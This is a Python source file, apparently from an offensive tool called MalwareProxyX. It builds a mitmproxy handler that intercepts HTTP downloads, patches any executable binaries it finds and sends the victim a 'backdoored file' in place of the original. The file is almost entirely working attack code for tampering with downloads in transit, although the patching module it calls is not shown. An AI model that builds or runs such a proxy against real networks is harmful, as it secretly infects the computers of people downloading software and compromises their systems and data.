#  Copyright (c) 2021 - Darsh Patel
#  All rights reserved.
#  Redistribution and use in source and binary forms, with or without modification,
#  are permitted provided that the following conditions are met:
#      1. Redistributions of source code must retain the above copyright notice,
#      this list of conditions and the following disclaimer.
#      2. Redistributions in binary form must reproduce the above copyright notice,
#      this list of conditions and the following disclaimer in the documentation
#      and/or other materials provided with the distribution.
#      3. Neither the name of the copyright holder nor the names of its contributors
#      may be used to endorse or promote products derived from this software without
#      specific prior written permission.
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#  POSSIBILITY OF SUCH DAMAGE.

import os

from MalwareProxyX.binary import BinaryProcessor

try:
    from mitmproxy import http
    from mitmproxy.tools.dump import DumpMaster
except ImportError:
    raise ImportError('mitmproxy isn\'t installed. You must install mitmproxy. '
                      'Ideally run the setup scripts again')

import logging

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


class TrafficHandler(object):
    def __init__(self, config):
        self.MaxRequestSize = 1000000
        self.logger = logger
        self.config = config

    @staticmethod
    def request(flow: http.HTTPFlow):
        print(f'Processing Request: {flow.request.pretty_url}')

    def response(self, flow: http.HTTPFlow):
        patch_request = True

        if 'content-length' in flow.request.headers.keys():
            if int(flow.request.headers['content-length'][0]) >= self.MaxRequestSize:
                self.logger.warning(
                    f"Not patching, Over Max Size Limit: {flow.request.pretty_url}")
                patch_request = False

        # ToDo: Check preconditions before processing
        if not patch_request:
            self.logger.warning(
                f"Not patching, didn't meet config preconditions: "
                f"{flow.request.pretty_url}")
            return

        file_content = flow.reply.obj.response.content
        try:
            binary = BinaryProcessor(file_content, self.config)
            if binary.binary_format is not None:
                self.logger.info(
                    f"FOUND: {binary.binary_format} Binary, attempting to patch")
                binary.save()
                patch_output = binary.patch()
                if patch_output:
                    self.logger.info("Sending Backdoored File")
                    # ToDo: Make Configurable
                    file_path = binary.file.name + "_patched"
                    with open(file_path, 'r+b') as backdoored:
                        flow.reply.obj.response.content = backdoored.read()
                        backdoored.close()
                    os.remove(file_path)
                    binary.file.close()
        except Exception as e:
            logger.error(f"Error Processing Binary: {e}")


class ProxyMaster(DumpMaster):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = logger

    def run(self):
        try:
            self.logger.info("Starting Proxy. Press Ctrl+C to Stop")
            DumpMaster.run(self)
        except KeyboardInterrupt:
            self.logger.info("Stopping Proxy Server")
            self.shutdown()
